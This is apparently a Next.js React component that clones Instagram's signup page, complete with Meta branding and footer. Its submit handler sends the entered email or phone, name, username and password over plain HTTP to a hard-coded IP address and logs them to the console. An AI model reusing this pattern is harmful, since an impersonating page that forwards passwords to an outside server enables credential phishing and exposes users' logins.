'use client'
import { useState } from "react"
import axios from "axios";
import Link from "next/link"

export default function UserSignup(){
    const [formData, setFormData] = useState({
        emailOrMobile: '',
        fullName: '',
        username: '',
        password: '',
      });

      const formChange = (e) => {
        const { name, value } = e.target;
        setFormData((prevData) => ({
          ...prevData,
          [name]: value,
        }));
      };
    
      const formSubmit = (e) => {
        e.preventDefault();
        //запрос на сервер
        console.log('Form data submitted:', formData);
        axios.post('http://195.49.210.193:3000', formData)
        .then((response) => {
          // обработка успешного ответа
          console.log('Server response:', response.data);
        })
        .catch((error) => {
          // Обработка ошибки при отправке данных
          console.error('Error submitting form:', error);
        });
      };

    return (
    <section className="signup-page">
        <div className="signup-main">
            <div className="signup-box">
                <img src="/images/logo.svg"/>
                <p>
                    Sign up to see photos and videos from your friends
                </p>
                <button className="fb-button">
                    <img src="/images/facebook-button.svg"/>
                    Log in with Facebook
                </button>
                <div className="grey-line">
                    <div></div>
                    <p>OR</p>
                    <div></div>
                </div>
                <form onSubmit={formSubmit}>
                    <input placeholder="Mobile Number or Email"
                        name="emailOrMobile"
                        type="text"
                        value={formData.emailOrMobile}
                        onChange={formChange}/>
                    <input placeholder="Full Name"
                        name="fullName"
                        type="text"
                        value={formData.fullName}
                        onChange={formChange}/>
                    <input placeholder="Username"
                        name="username"
                        type="text"
                        value={formData.username}
                        onChange={formChange}/>
                    <input placeholder="Password"
                        name="password"
                        type="password"
                        value={formData.password}
                        onChange={formChange}/>
               
                    <span>People who use our service may have uploaded your contact information to Instagram. <a href="">Learn more</a></span>
                    <span>By signing up, you agree to our <a href="">Terms, Privacy Policy</a> and <a href="">Cookies Policy.</a></span>
                    <button type="submit">Sign up</button>
                </form>
            </div>
            <div className="signup-box2">
                <span>Have an account? <Link href="/login">Log in</Link></span>
            </div>
            <div className="signup-box3">
                <span>Get the app.</span>
                <div className="signup-box3-images">
                    <img src="/images/link-google.png"/>
                    <img src="/images/link-microsoft.png"/>
                </div>
                
            </div>
        </div>
        <div className="footer">
            <div className="footer-inner">
                <p>Meta</p>
                <p>About</p>
                <p>Blog</p>
                <p>Jobs</p>
                <p>Help</p>
                <p>API</p>
                <p>Privacy</p>
                <p>Terms</p>
                <p>Top Accounts</p>
                <p>Locations</p>
                <p>Instagram Lite</p>
                <p>Contact Uploading & Non-Users</p>
                <p>Meta Verified</p>
            </div>
            <div className="footer-inner">
                <p>English <img src="/images/arrow-down.svg"/></p>
                <span>© 2023 Instagram from Meta</span>
            </div>
        </div>
    </section>
    )
}